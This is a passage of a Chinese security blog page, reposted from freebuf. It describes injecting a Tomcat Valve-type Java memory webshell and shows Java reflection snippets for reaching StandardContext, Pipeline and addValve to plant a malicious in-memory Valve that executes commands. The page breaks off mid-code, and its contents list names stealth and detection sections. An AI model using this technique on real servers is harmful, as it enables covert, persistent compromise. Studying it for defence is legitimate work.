<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><script src="/xvsf/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=xvsf/livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>Java内存马——Tomcat Valve型的三种注入 | xvsf</title>
<meta name="keywords" content="java安全, 内存马, 转载">
<meta name="description" content="Java内存马——Tomcat Valve型的三种注入">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/xvsf/posts/java%E5%86%85%E5%AD%98%E9%A9%ACtomcat-valve%E5%9E%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%B3%A8%E5%85%A5/">
<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.a9f4af423966cfc097dfc1790a17f0334ce447fe70f17f76a15c301d1664e733.css" integrity="sha256-qfSvQjlmz8CX38F5ChfwM0zkR/5w8X92oVwwHRZk5zM=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/xvsf/img/2.jpg">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/xvsf/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/xvsf/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/xvsf/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/xvsf/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/xvsf/posts/java%E5%86%85%E5%AD%98%E9%A9%ACtomcat-valve%E5%9E%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%B3%A8%E5%85%A5/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css" />

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-lite-webfont@1.1.0/style.css" />

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-tc-webfont@1.0.0/style.css" />

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.1.0/style.css" />



<div class="progress-bar"></div>


<script>
document.addEventListener('DOMContentLoaded', () => {
    const progressBar = document.querySelector('.progress-bar');

    
    const calculateScrollProgress = () => {
        const windowHeight = window.innerHeight;
        const documentHeight = document.documentElement.scrollHeight - windowHeight;
        const scrollTop = window.scrollY;
        const progress = (scrollTop / documentHeight) * 100;
        progressBar.style.width = `${progress}%`;
    };

    
    window.addEventListener('scroll', calculateScrollProgress);

    
    calculateScrollProgress();
});
</script>

</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/xvsf/" accesskey="h" title="xvsf (Alt + H)">xvsf</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/xvsf/" title="首页">
                    <span>首页</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/xvsf/posts/" title="文章">
                    <span>文章</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/xvsf/categories/" title="归类">
                    <span>归类</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/xvsf/tags/" title="标签">
                    <span>标签</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/xvsf/search/" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/xvsf/about/" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      Java内存马——Tomcat Valve型的三种注入
    </h1>
    <div class="post-description">
      Java内存马——Tomcat Valve型的三种注入
    </div>
    <div class="post-meta"><span title='2025-11-08 15:04:00 +0800 CST'>November 8, 2025</span>&nbsp;·&nbsp;18 min&nbsp;·&nbsp;<a href="http://localhost:1313/xvsf/categories/java%E5%AE%89%E5%85%A8/">Java安全</a>

</div>
  </header> 

  
  
  <div class="post-content" style="position: relative;">
    
    <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#java%e5%86%85%e5%ad%98%e9%a9%actomcat-valve%e5%9e%8b%e7%9a%84%e4%b8%89%e7%a7%8d%e6%b3%a8%e5%85%a5" aria-label="Java内存马——Tomcat Valve型的三种注入">Java内存马——Tomcat Valve型的三种注入</a><ul>
                            
                    <li>
                        <a href="#%e6%a0%b8%e5%bf%83%e5%8e%9f%e7%90%86" aria-label="核心原理">核心原理</a></li>
                    <li>
                        <a href="#%e6%b3%a8%e5%85%a5%e6%96%b9%e5%bc%8f%e8%af%a6%e8%a7%a3" aria-label="注入方式详解">注入方式详解</a><ul>
                            
                    <li>
                        <a href="#%e6%96%b9%e5%bc%8f%e4%b8%80%e7%ba%af%e5%8f%8d%e5%b0%84%e6%b3%a8%e5%85%a5%e6%97%a0%e4%be%9d%e8%b5%96" aria-label="方式一：纯反射注入（无依赖）">方式一：纯反射注入（无依赖）</a></li>
                    <li>
                        <a href="#%e6%96%b9%e5%bc%8f%e4%ba%8c%e6%b7%b7%e5%90%88%e6%96%b9%e5%bc%8f%e5%88%a9%e7%94%a8-tomcat-api--%e5%8f%8d%e5%b0%84" aria-label="方式二：混合方式（利用 Tomcat API &amp; 反射）">方式二：混合方式（利用 Tomcat API &amp; 反射）</a></li>
                    <li>
                        <a href="#%e6%96%b9%e5%bc%8f%e4%b8%89java-agent--asmjavassist-%e5%ad%97%e8%8a%82%e7%a0%81%e6%b3%a8%e5%85%a5%e7%bb%88%e6%9e%81%e9%9a%90%e8%94%bd" aria-label="方式三：Java Agent &#43; ASM/Javassist 字节码注入（终极隐蔽）">方式三：Java Agent + ASM/Javassist 字节码注入（终极隐蔽）</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e7%ba%af%e5%8f%8d%e5%b0%84%e6%b3%a8%e5%85%a5" aria-label="纯反射注入">纯反射注入</a><ul>
                            
                    <li>
                        <a href="#%e4%b8%80%e6%a0%b8%e5%bf%83%e5%8e%9f%e7%90%86%e4%b8%8e%e7%9b%ae%e6%a0%87" aria-label="一、核心原理与目标"><strong>一、核心原理与目标</strong></a></li>
                    <li>
                        <a href="#%e4%ba%8c%e6%b3%a8%e5%85%a5%e6%b5%81%e7%a8%8b%e8%af%a6%e8%a7%a3" aria-label="二、注入流程详解">二、注入流程详解</a><ul>
                            
                    <li>
                        <a href="#%e6%ad%a5%e9%aa%a41%e8%8e%b7%e5%8f%96webappclassloader" aria-label="步骤1：获取WebappClassLoader"><strong>步骤1：获取WebappClassLoader</strong></a></li>
                    <li>
                        <a href="#%e6%ad%a5%e9%aa%a42%e5%8f%8d%e5%b0%84%e8%8e%b7%e5%8f%96standardcontext" aria-label="步骤2：反射获取StandardContext"><strong>步骤2：反射获取StandardContext</strong></a></li>
                    <li>
                        <a href="#%e6%ad%a5%e9%aa%a43%e8%8e%b7%e5%8f%96pipeline%e5%af%b9%e8%b1%a1" aria-label="步骤3：获取Pipeline对象"><strong>步骤3：获取Pipeline对象</strong></a></li>
                    <li>
                        <a href="#%e6%ad%a5%e9%aa%a44%e5%ae%9a%e4%b9%89%e6%81%b6%e6%84%8fvalve%e7%b1%bb%e5%86%85%e5%ad%98%e5%8a%a0%e8%bd%bd" aria-label="步骤4：定义恶意Valve类（内存加载）"><strong>步骤4：定义恶意Valve类（内存加载）</strong></a></li>
                    <li>
                        <a href="#%e6%ad%a5%e9%aa%a45%e5%ae%9e%e4%be%8b%e5%8c%96%e5%b9%b6%e6%b3%a8%e5%85%a5valve" aria-label="步骤5：实例化并注入Valve"><strong>步骤5：实例化并注入Valve</strong></a></li>
                    <li>
                        <a href="#%e6%ad%a5%e9%aa%a46%e5%8f%af%e9%80%89%e6%8e%a7%e5%88%b6%e6%b3%a8%e5%85%a5%e4%bd%8d%e7%bd%ae" aria-label="步骤6（可选）：控制注入位置"><strong>步骤6（可选）：控制注入位置</strong></a></li></ul>
                    </li>
                    <li>
                        <a href="#%e4%b8%89%e6%81%b6%e6%84%8fvalve%e7%b1%bb%e5%ae%9e%e7%8e%b0%e6%a8%a1%e6%9d%bf" aria-label="三、恶意Valve类实现模板"><strong>三、恶意Valve类实现模板</strong></a></li>
                    <li>
                        <a href="#%e5%9b%9b%e6%8a%80%e6%9c%af%e9%9a%be%e7%82%b9%e4%b8%8e%e8%a7%84%e9%81%bf%e6%96%b9%e6%a1%88" aria-label="四、技术难点与规避方案"><strong>四、技术难点与规避方案</strong></a></li>
                    <li>
                        <a href="#%e4%ba%94%e6%a3%80%e6%b5%8b%e4%b8%8e%e9%98%b2%e5%be%a1%e6%89%8b%e6%ae%b5" aria-label="五、检测与防御手段"><strong>五、检测与防御手段</strong></a><ul>
                            
                    <li>
                        <a href="#%e6%a3%80%e6%b5%8b%e6%96%b9%e6%a1%88" aria-label="检测方案"><strong>检测方案</strong></a></li>
                    <li>
                        <a href="#%e9%98%b2%e5%be%a1%e6%8e%aa%e6%96%bd" aria-label="防御措施"><strong>防御措施</strong></a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#%e6%b7%b7%e5%90%88%e6%96%b9%e5%bc%8f%e5%88%a9%e7%94%a8-tomcat-api--%e5%8f%8d%e5%b0%84" aria-label="混合方式（利用 Tomcat API &amp; 反射）">混合方式（利用 Tomcat API &amp; 反射）</a><ul>
                            
                    <li>
                        <a href="#%e4%b8%80%e6%b7%b7%e5%90%88%e6%b3%a8%e5%85%a5%e7%9a%84%e6%a0%b8%e5%bf%83%e4%bc%98%e5%8a%bf" aria-label="一、混合注入的核心优势">一、混合注入的核心优势</a></li>
                    <li>
                        <a href="#%e4%ba%8c%e6%b7%b7%e5%90%88%e6%b3%a8%e5%85%a5%e8%af%a6%e7%bb%86%e6%b5%81%e7%a8%8b" aria-label="二、混合注入详细流程">二、混合注入详细流程</a></li>
                    <li>
                        <a href="#%e5%89%8d%e7%bd%ae%e6%9d%a1%e4%bb%b6" aria-label="前置条件">前置条件</a><ul>
                            
                    <li>
                        <a href="#%e6%96%b9%e6%b3%95a%e9%80%9a%e8%bf%87servletcontext%e6%8e%a8%e8%8d%90" aria-label="方法A：通过ServletContext（推荐）">方法A：通过ServletContext（推荐）</a></li>
                    <li>
                        <a href="#%e6%96%b9%e6%b3%95b%e9%80%9a%e8%bf%87classloader%e6%97%a0request%e6%97%b6" aria-label="方法B：通过ClassLoader（无request时）">方法B：通过ClassLoader（无request时）</a></li>
                    <li>
                        <a href="#%e6%96%b9%e6%b3%95a%e5%8a%a8%e6%80%81%e7%b1%bb%e5%ae%9a%e4%b9%89%e6%97%a0%e6%96%87%e4%bb%b6%e8%90%bd%e5%9c%b0" aria-label="方法A：动态类定义（无文件落地）">方法A：动态类定义（无文件落地）</a></li>
                    <li>
                        <a href="#%e6%96%b9%e6%b3%95b%e5%ad%97%e8%8a%82%e7%a0%81%e6%b3%a8%e5%85%a5asm%e5%a2%9e%e5%bc%ba" aria-label="方法B：字节码注入（ASM增强）">方法B：字节码注入（ASM增强）</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e4%b8%89%e9%ab%98%e7%ba%a7%e9%9a%90%e8%94%bd%e6%8a%80%e6%9c%af" aria-label="三、高级隐蔽技术">三、高级隐蔽技术</a></li>
                    <li>
                        <a href="#2-%e8%87%aa%e4%bf%9d%e6%8a%a4%e6%9c%ba%e5%88%b6" aria-label="2. 自保护机制">2. 自保护机制</a></li>
                    <li>
                        <a href="#3-%e4%b8%8a%e4%b8%8b%e6%96%87%e6%84%9f%e7%9f%a5%e8%a7%a6%e5%8f%91" aria-label="3. 上下文感知触发">3. 上下文感知触发</a></li>
                    <li>
                        <a href="#%e5%9b%9b%e6%a3%80%e6%b5%8b%e4%b8%8e%e9%98%b2%e5%be%a1%e6%96%b9%e6%a1%88" aria-label="四、检测与防御方案">四、检测与防御方案</a></li>
                    <li>
                        <a href="#%e4%ba%94%e6%b7%b7%e5%90%88%e6%b3%a8%e5%85%a5%e7%9a%84%e6%bc%94%e8%bf%9b%e8%b6%8b%e5%8a%bf" aria-label="五、混合注入的演进趋势">五、混合注入的演进趋势</a></li>
                    <li>
                        <a href="#%e6%80%bb%e7%bb%93" aria-label="总结">总结</a></li></ul>
                    </li>
                    <li>
                        <a href="#agent--asmjavassist-%e5%ad%97%e8%8a%82%e7%a0%81%e6%b3%a8%e5%85%a5" aria-label="Agent &#43; ASM/Javassist 字节码注入">Agent + ASM/Javassist 字节码注入</a><ul>
                            
                    <li>
                        <a href="#%e4%b8%80%e6%94%bb%e5%87%bb%e6%b5%81%e7%a8%8b%e8%af%a6%e8%a7%a3" aria-label="一、攻击流程详解">一、攻击流程详解</a></li>
                    <li>
                        <a href="#%e4%ba%8c%e5%ad%97%e8%8a%82%e7%a0%81%e4%bf%ae%e6%94%b9%e6%8a%80%e6%9c%afasm%e6%a0%b8%e5%bf%83%e5%ae%9e%e7%8e%b0" aria-label="二、字节码修改技术（ASM核心实现）">二、字节码修改技术（ASM核心实现）</a></li>
                    <li>
                        <a href="#%e4%b8%89%e9%9a%90%e8%94%bd%e6%80%a7%e5%a2%9e%e5%bc%ba%e6%8a%80%e6%9c%af" aria-label="三、隐蔽性增强技术">三、隐蔽性增强技术</a></li>
                    <li>
                        <a href="#%e5%9b%9b%e6%a3%80%e6%b5%8b%e9%98%b2%e5%be%a1%e7%ad%96%e7%95%a5" aria-label="四、检测防御策略">四、检测防御策略</a>
                    </li>
                </ul>
                </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>
<h1 id="java内存马tomcat-valve型的三种注入">Java内存马——Tomcat Valve型的三种注入<a hidden class="anchor" aria-hidden="true" href="#java内存马tomcat-valve型的三种注入">#</a></h1>
<p><strong>转载自：</strong><a href="https://www.freebuf.com/articles/web/433972.html"><strong>https://www.freebuf.com/articles/web/433972.html</strong></a></p>
<h2 id="核心原理">核心原理<a hidden class="anchor" aria-hidden="true" href="#核心原理">#</a></h2>
<ul>
<li>**Tomcat Pipeline &amp; Valve：**Tomcat 使用责任链模式处理请求。<code>Pipeline</code>包含多个<code>Valve</code>，每个<code>Valve</code>负责特定任务（如认证、日志、访问控制）。<code>StandardWrapperValve</code>(通常位于链尾) 最终调用 Servlet。</li>
<li>**<code>StandardContext</code>：**代表一个 Web 应用，持有其对应的<code>Pipeline</code>对象 (<code>StandardContext#getPipeline()</code>)。</li>
<li>**目标：**将恶意<code>Valve</code>注入到目标 Web 应用<code>StandardContext</code>的<code>Pipeline</code>中，通常是插入在<code>StandardContextValve</code>(负责应用级路由) 和<code>StandardWrapperValve</code>(负责调用 Servlet) 之间，或者尽可能靠前（如紧接在<code>AccessLogValve</code>之后）。恶意 Valve 的<code>invoke()</code>方法检查特定请求特征，匹配则执行命令并截断管道（不再调用<code>getNext().invoke()</code>），直接返回响应。</li>
</ul>
<h2 id="注入方式详解">注入方式详解<a hidden class="anchor" aria-hidden="true" href="#注入方式详解">#</a></h2>
<h3 id="方式一纯反射注入无依赖">方式一：纯反射注入（无依赖）<a hidden class="anchor" aria-hidden="true" href="#方式一纯反射注入无依赖">#</a></h3>
<ul>
<li>
<p><strong>场景：<strong>攻击者已通过漏洞（如反序列化、文件上传 Webshell、其他 RCE）获得代码执行能力，但</strong>当前执行环境没有 Tomcat 的<code>catalina.jar</code>等库依赖</strong>（例如在<code>Bootstrap ClassLoader</code>或<code>Common ClassLoader</code>加载的类中执行）。这是最通用的方式。</p>
</li>
<li>
<p><strong>步骤：</strong></p>
<ol>
<li>
<p><strong>获取当前线程的<code>ContextClassLoader</code>(通常是<code>WebappClassLoader</code>):</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ClassLoader webappClassLoader = Thread.currentThread().getContextClassLoader();</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
<li>
<p><strong>反射获取<code>ApplicationContext</code>(关键):</strong></p>
<ul>
<li>Tomcat 将<code>ApplicationContext</code>存储在<code>WebappClassLoader</code>的<code>resources</code>属性 (<code>org.apache.catalina.webresources.StandardRoot</code>) 的<code>context</code>属性中。</li>
<li>或者通过<code>ClassLoader</code>的<code>resources</code>属性获取<code>WebResourceRoot</code>，再反射获取其<code>context</code>属性。</li>
</ul>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6">6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7">7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8">8</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">// 通过 WebappClassLoader 获取 resources (StandardRoot)
</span></span><span class="line"><span class="cl">Field resourcesField = webappClassLoader.getClass().getDeclaredField(&#34;resources&#34;);
</span></span><span class="line"><span class="cl">resourcesField.setAccessible(true);
</span></span><span class="line"><span class="cl">Object standardRoot = resourcesField.get(webappClassLoader);
</span></span><span class="line"><span class="cl">// 通过 StandardRoot 获取 Context (StandardContext)
</span></span><span class="line"><span class="cl">Field contextField = standardRoot.getClass().getDeclaredField(&#34;context&#34;);
</span></span><span class="line"><span class="cl">contextField.setAccessible(true);
</span></span><span class="line"><span class="cl">Object standardContext = contextField.get(standardRoot); // 这就是目标 StandardContext</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
<li>
<p><strong>反射获取<code>Pipeline</code>对象：</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Method getPipelineMethod = standardContext.getClass().getMethod(&#34;getPipeline&#34;);
</span></span><span class="line"><span class="cl">Object pipeline = getPipelineMethod.invoke(standardContext);</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
<li>
<p><strong>反射获取<code>addValve</code>方法：</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Method addValveMethod = pipeline.getClass().getMethod(&#34;addValve&#34;, Valve.class);</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
<li>
<p><strong>构造恶意 Valve 实例：</strong></p>
<ul>
<li>将恶意 Valve 的字节码（编译后的<code>.class</code>文件内容）转换为<code>byte[]</code>(可通过 Class 文件硬编码、远程加载、解码等方式)。</li>
<li>使用当前<code>WebappClassLoader</code>的<code>defineClass</code>方法（需反射调用）在内存中定义恶意 Valve 类。</li>
</ul>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
